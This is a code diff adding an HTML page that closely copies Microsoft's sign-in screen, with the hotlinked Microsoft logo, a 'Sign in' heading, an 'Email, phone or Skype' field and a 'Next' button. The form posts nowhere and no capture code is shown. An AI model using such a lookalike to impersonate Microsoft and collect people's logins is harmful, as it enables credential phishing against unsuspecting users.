@@ -1,0 +1,82 @@
+<style>
+    @keyframes MoveInFromRight {
+        0% {
+            opacity: 0;
+            transform: translate(+100%);
+        }
+        50% { 
+            opacity: 0
+        }
+        70% { 
+            opacity: 1
+        }
+        100% {
+            transform: translate(0%);
+        }
+    }
+    *{
+        font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', sans-serif;
+    }
+    body {
+        position: relative;
+    }
+    input {
+        background-color: transparent;
+        padding: 11px 0;
+        border: none;
+        border-bottom: 1px solid rgb(110, 110, 110);
+        outline: none;
+        font-size: 15px;
+        transition: 0.5s;
+        width: 300px;
+    }
+    input:focus {
+        border-bottom: 1px solid #173e7c;
+    }
+    input:hover {
+        border-bottom: 1px solid rgb(53, 53, 53);
+    }
+    input::placeholder {opacity:0.83}
+    .content{
+        animation: MoveInFromRight 0.9s;
+    }
+    form {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    .btn {
+        background-color: #0067b8;
+        color: white;
+        padding: 6px 35px;
+        transition: 0.2s ease-in-out;
+        margin-top: 35px;
+        cursor: pointer;
+        width: fit-content;
+    }
+    .btn:hover:enabled {
+        background-color: #014a81;
+    }
+    .btn:disabled {
+        background-color: whitesmoke;
+        color: rgb(150, 150, 150);
+        cursor: initial;
+    }
+</style>
+
+<body>
+    <form method="POST" action="">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+            style="width:120px;height:auto;display:block;margin-left: 0;margin-right: auto;" />
+        <div class="content">
+            <h2 style="margin-bottom:10px;display:block;margin-left: 0;margin-right: auto;">Sign in</h2>
+            <input id="1" placeholder="Email, phone or Skype" type="text" onfocus="isClicked(event)" onfocusout="isClicked(event)" onkeyup="done()" />
+            <input id="bn" type="submit" class="btn" value="Next" style="margin-left: auto; 
+            margin-right: 0;display: block;"/>
+        </div>
+    </form>
+</body>
